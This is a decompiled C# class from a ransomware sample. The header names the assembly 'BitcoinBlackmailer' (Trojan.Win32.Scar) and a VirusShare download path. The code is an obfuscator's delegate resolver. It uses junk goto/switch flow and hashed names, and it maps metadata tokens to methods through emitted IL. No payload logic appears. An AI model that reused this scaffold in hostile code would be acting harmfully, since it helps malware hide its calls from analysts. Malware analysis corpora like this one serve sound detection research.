// Decompiled with JetBrains decompiler
// Type: A.cce7650f3348b2ba193718ae5d2bee0d9
// Assembly: BitcoinBlackmailer, Version=2.4.5.0, Culture=neutral, PublicKeyToken=null
// MVID: 4C6D3383-405F-454B-A25B-FBC4B1EC529F
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Trojan.Win32.Scar.oenx-0b164fc0270c83f0d5c3ac554421cfbccd0404ae7c79f700aa485fdf86912ef4.exe

using System;
using System.Reflection;
using System.Reflection.Emit;

namespace A
{
  internal class cce7650f3348b2ba193718ae5d2bee0d9
  {
    private static readonly int c821ca61cc8f1c76be955497cfa662d48;
    private static readonly int c1810d6a97289722568b37e12bb0f50f4;
    private static readonly int caa3313545af6a0f16f180bdf264982ed;
    private static readonly int cbe1fd7dcd9f98ec43d9823d961d20ff9;
    private static readonly int c6cb092604c796b5a1356a5ee44765db7;
    private static readonly int cd324c2eff9556d103326db3d2361bb71;
    private static readonly int c67aa3a593152808e465b1029c953e086;
    private static readonly int c00b41921ebba2c5b6f0d8d2244615248;
    private static readonly int cf5ce434e7a192ccae40c39aaccf99b6b;
    private static readonly int c5829ff66424f68630a63b7485afa3c65;
    private static readonly int cd72da2bbaa9d30c6a07e3cd863444980;
    private static readonly int c6059950e13b94fa226c6e119f53ed3d1;
    private static readonly int cd91149e0d99320d7e5e668c5e50a5ed8;
    private static readonly int c11e07dd1e1e4aaf7c9f28bfc7730f020;
    private static readonly int c9836993d9a3e773661ff259c4e675ad7;
    private static readonly int cf854f7a5541256840adc528cb940853b;
    private static readonly int cb3b8d5fc15e834f3ff92dcc6f60d9a08;
    private static readonly int c68c3f53bd9a2513363f6904587c7e219;
    private static readonly int cb817f13b98aafc7ec0054066922e81a7;
    private static readonly int c50b5176b911363d067e209ce4d7292c7;
    private static readonly ModuleHandle cad5dda31fcbf7250190b1afdbfb846e1;

    static cce7650f3348b2ba193718ae5d2bee0d9()
    {
      if ((object) typeof (MulticastDelegate) == null)
        return;
      cce7650f3348b2ba193718ae5d2bee0d9.cad5dda31fcbf7250190b1afdbfb846e1 = Assembly.GetExecutingAssembly().GetModules()[0].ModuleHandle;
    }

    private int c292799eea6dfc86e3ecfbc37ed995570 => 1;

    public static void c15b23b326e808f2b5951298a7fd9d282(
      int c8f16495241c6d561e50ab55e094d7410,
      int cd2d7c2ce576195b5e52dd86f2b88e2e4,
      int c33d7f7b13c587a526f7ecaf28f8ef71b)
    {
      Type typeFromHandle;
      MethodInfo method;
      try
      {
        typeFromHandle = Type.GetTypeFromHandle(cce7650f3348b2ba193718ae5d2bee0d9.cad5dda31fcbf7250190b1afdbfb846e1.ResolveTypeHandle(c8f16495241c6d561e50ab55e094d7410));
        object methodFromHandle;
        if (c33d7f7b13c587a526f7ecaf28f8ef71b == 16777215)
        {
label_1:
          switch (7)
          {
            case 0:
              goto label_1;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (cce7650f3348b2ba193718ae5d2bee0d9.c15b23b326e808f2b5951298a7fd9d282);
              }
              methodFromHandle = (object) MethodBase.GetMethodFromHandle(cce7650f3348b2ba193718ae5d2bee0d9.cad5dda31fcbf7250190b1afdbfb846e1.ResolveMethodHandle(cd2d7c2ce576195b5e52dd86f2b88e2e4));
              break;
          }
        }
        else
          methodFromHandle = (object) MethodBase.GetMethodFromHandle(cce7650f3348b2ba193718ae5d2bee0d9.cad5dda31fcbf7250190b1afdbfb846e1.ResolveMethodHandle(cd2d7c2ce576195b5e52dd86f2b88e2e4), cce7650f3348b2ba193718ae5d2bee0d9.cad5dda31fcbf7250190b1afdbfb846e1.ResolveTypeHandle(c33d7f7b13c587a526f7ecaf28f8ef71b));
        method = (MethodInfo) methodFromHandle;
      }
      catch (Exception ex)
      {
        throw;
      }
      foreach (FieldInfo field in typeFromHandle.GetFields(BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.GetField))
      {
        try
        {
          Delegate @delegate;
          if (method.IsStatic)
          {
            @delegate = Delegate.CreateDelegate(field.FieldType, method);
          }
          else
          {
            ParameterInfo[] parameters = method.GetParameters();
            int length = parameters.Length + 1;
            Type[] parameterTypes = new Type[length];
            parameterTypes[0] = !method.DeclaringType.IsValueType ? typeof (object) : method.DeclaringType.MakeByRefType();
            for (int index = 1; index < length; ++index)
              parameterTypes[index] = parameters[index - 1].ParameterType;
label_15:
            switch (2)
            {
              case 0:
                goto label_15;
              default:
                DynamicMethod dynamicMethod = new DynamicMethod(string.Empty, method.ReturnType, parameterTypes, typeFromHandle, true);
                ILGenerator ilGenerator1 = dynamicMethod.GetILGenerator();
                ilGenerator1.Emit(OpCodes.Ldarg_0);
                if (length > 1)
                {
label_17:
                  switch (3)
                  {
                    case 0:
                      goto label_17;
                    default:
                      ilGenerator1.Emit(OpCodes.Ldarg_1);
                      break;
                  }
                }
                if (length > 2)
                {
label_20:
                  switch (6)
                  {
                    case 0:
                      goto label_20;
                    default:
                      ilGenerator1.Emit(OpCodes.Ldarg_2);
                      break;
                  }
                }
                if (length > 3)
                  ilGenerator1.Emit(OpCodes.Ldarg_3);
                if (length > 4)
                {
label_25:
                  switch (5)
                  {
                    case 0:
                      goto label_25;
                    default:
                      for (int index = 4; index < length; ++index)
                        ilGenerator1.Emit(OpCodes.Ldarg_S, index);
label_29:
                      switch (5)
                      {
                        case 0:
                          goto label_29;
                      }
                      break;
                  }
                }
                ILGenerator ilGenerator2 = ilGenerator1;
                OpCode opcode;
                if (!field.IsFamilyOrAssembly)
                {
label_31:
                  switch (5)
                  {
                    case 0:
                      goto label_31;
                    default:
                      opcode = OpCodes.Call;
                      break;
                  }
                }
                else
                  opcode = OpCodes.Callvirt;
                MethodInfo meth = method;
                ilGenerator2.Emit(opcode, meth);
                ilGenerator1.Emit(OpCodes.Ret);
                @delegate = dynamicMethod.CreateDelegate(typeFromHandle);
                break;
            }
          }
          field.SetValue((object) null, (object) @delegate);
        }
        catch (Exception ex)
        {
        }
      }
label_39:
      switch (6)
      {
        case 0:
          goto label_39;
      }
    }
  }
}
